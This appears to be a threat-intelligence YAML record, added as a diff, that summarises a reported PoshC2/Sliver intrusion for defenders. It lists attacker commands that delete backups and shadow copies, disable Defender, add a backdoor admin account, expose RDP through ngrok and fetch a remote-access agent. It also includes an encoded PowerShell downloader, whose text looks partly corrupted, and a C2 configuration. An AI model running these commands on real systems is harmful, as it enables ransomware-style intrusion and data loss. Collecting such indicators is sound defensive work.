@@ -1,0 +1,146 @@
+description: This report details a cyber threat involving the deployment of PoshC2
+  and related tools, including Atera agent installation, service modifications, and
+  defense evasion techniques. The attacker utilizes batch scripts to perform configuration
+  changes, delete shadow copies, disable security features, and establish persistence.
+date: '2024-08-12'
+authors:
+- r3nzsec
+- 0xtornado
+- 0xThiebaut
+attribution: Unknown (likely associated with Blackbyte, Promethus, Phobos)
+malware_families:
+- Sliver
+- PoshC2
+- SystemBC
+- Atera
+- Atera Agent
+TTPs:
+  processs:
+  - wbadmin
+  - wmic
+  - vssadmin
+  - bcdedit
+  - cmd.exe
+  - powershell
+  - curl
+  - msiexec
+  - sc
+  - taskkill
+  - reg
+  - RMDIR
+  - attrib
+  - del
+  - evtutil
+  - wevtutil
+  - ngrok
+  - SystemBC
+  - vssadmin.exe
+  - net.exe
+  - sc.exe
+  - powershell.exe
+  - curl.exe
+  - msiexec.exe
+  - ngrok.exe
+  - Posh_v2_dropper_x64.exe
+  commandline:
+  - wbadmin STOP job
+  - wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0 -quiet
+  - wbadmin DELETE CATALOG -quiet
+  - wbadmin DISABLE backup
+  - bcdedit /set {default} recoveryenabled No
+  - bcdedit /set {default} bootstatuspolicy ignoreallfailures
+  - cmd.exe /C wbadmin STOP job
+  - cmd.exe /C wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0 -quiet
+  - cmd.exe /C wbadmin DELETE CATALOG -quiet
+  - cmd.exe /C wbadmin DISABLE backup
+  - cmd.exe /C bcdedit /set {default} recoveryenabled No
+  - cmd.exe /C bcdedit /set {default} bootstatuspolicy ignoreallfailures
+  - msiexec /x {product code} /qn
+  - sc config MSExchangeDelivery start= disabled
+  - net stop MSExchangeDelivery
+  - taskkill -f -im sqlbrowser.exe
+  - taskkill -f -im sqlwriter.exe
+  - taskkill -f -im sqlservr.exe
+  - taskkill -f -im msmdsrv.exe
+  - taskkill -f -im MsDtsSrvr.exe
+  - curl https://download.atera.com/agent/AteraAgentSetup.msi
+  - attrib Default.rdp -s -h
+  - del Default.rdp
+  - ngrok config add-authtoken <token>
+  - ngrok tcp 3389
+  - vssadmin.exe Delete Shadows /All /Quiet
+  - vssadmin delete shadows /all
+  - net user WDAGUtilltyAccount Ujmqaz5055 /add
+  - net localgroup Administrators WDAGUtilltyAccount /add
+  - reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections
+    /t REG_DWORD /d 0 /f
+  - netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP
+    localport=3389 action=allow
+  - curl -o setup.msi "https://HelpdeskSupport613811560.servicedesk.atera.com/GetAgent/Msi/?customerId=1&[email
+    protected]&accountId=<redacted>" && msiexec /i setup.msi /qn [email protected]
+    CompanyId=1 AccountId=<redacted>
+  - ngrok config add-authtoken
+  - ngrok tcp
+  - powershell -exec bypass -Noninteractive -windowstyle hidden -eWwBTAHKkAcwBOAGUAbQAUAE4AZQBOAC4AUWBTAHIAdgBpAGMAZQBQAG8AaQBUAHQATQBhAG4AYQBNAGUACcgBdADOAOgBTAGUACGB2AGUAcgBDAGUACcgBOAGKAZgBpAGMAYQBOAGUAVgBhAGwAaQBKAGEAJABpAG8AbgBDAGEAbDABSAGIAYQBjAGSATIAA9ACAAewAKAHQAcgB1AGUATQA7ACQATQBTADOAWWBTAHKACWBOAGUAbQAUAFQAZQB4AHQALgBFAG4AYwBVAGQAaQBUAGCAXQAG6ADOAVQBUAEYAQDAAUAECcAZQBOAFMAdABYAGkAbgBnACgAWWBTAHKAcwBOAGUAbQAUAEMAbwBUAHYAZQBYAHQAXQAG6ADOARgBYAGBAbQBCAGEACWB1ADYANABTAHQAcgBpAG4AZwAoACgAbgB1AHCALQBVAGIAagB
+    lAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgB lAHQALgB3AGUAYgBjAGwAaQB1AG4AdAApAC4AZABVAHCAbgBsAGBAYQBKAHMAdABYAGkAbgBnACgAJwBoAHQAdABWAHMAOgAVACBAMQA4ADUALgAYADMANAAuADIAMQA2AC4ANgAOAC8AdABYAGEAZABTAHIALQB1AHAAZABhAHQAZQAVAGgAaQBzAHQAbwBYyAHKAJgBwWwAGQAPQAVAF8ACgBWACcAKQApACKAOwWBJAEUAWAAgACQATQBTAA==
+  - sc.exe config Dnscache start= auto
+  - sc.exe config SSDPSRV start= auto
+  - sc.exe config FDResPub start= auto
+  - sc.exe config upnphost start= auto
+  powershell:
+  - Add-ComputerRestore -Description "Windows Defender Real-Time Protection" -Drive
+    "C:"
+  - Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-TimeProtection"
+    -Name DisableRealtimeMonitoring -Value 1
+  - '{ "ConnectURL": "/webhp/", "Key": "bX7WACSlpm2NpvJdQbRV8DHAjmEJpKWM8n4bkG6bzCI=",
+    "KillDate": "2999-12-01", "URLID": 1, "PayloadCommsHost": "https://94.198.53.143",
+    "StageRetriesLimit": 30, "StageRetries": true, "StageRetriesInitialWait": 60,
+    "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+    like Gecko) Chrome/80.0.3987.122 Safari/537.36" }'
+  registry_keys:
+  - HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Real-TimeProtection
+  - HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender
+  - HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Run
+  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security
+  - HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server
+  network_connections:
+  - port: 443
+    destination: 94.198.53.143
+  - port: 8000
+    destination: 185.234.216.64
+  - protocol: TCP
+    port: 4337
+    destination: 94.198.55.181
+  - protocol: TCP
+    port: 4337
+    destination: 94.198.51.247
+  file_modifications:
+  - path: C:\\Windows\\System32\\drivers\\default.rdp
+  - path: $Recycle.Bin
+  - setup.msi
+  persistence:
+  - Registry key modification under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Run
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key of value
+    socks5
+  pipes: []
+  process_relations: []
+IOCs:
+  hashes:
+  - 754e08c93369e5bfe24ca09b422affdd
+  - 591379f5d7d256e83de05207fd872acfa8e8aa5e
+  - ea7dec8fa52d2300350367691ae2fbea13dbd5bf80d6b43b05eedf197529aa77
+  - aatera_del.bat
+  - 3c1853831958efe2cc78ea82b4fbd565
+  - dc14cffa48dd95157fd381cb75bae1773d510c54
+  - 512beb7dfa9fdbc8be7fbf59c7bec7911296f9e36c8a3d3b95e7aef4a88bf09c
+  ips:
+  - 94.198.53.143
+  - 185.234.216.64
+  - 94.198.55.181
+  - 94.198.51.247
+  domains: []
+  urls:
+  - https://HelpdeskSupport613811560.servicedesk.atera.com/GetAgent/Msi/?customerId=1&[email
+    protected]&accountId=<redacted>
+reference: https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/
+file_creation_date: May 13, 2025
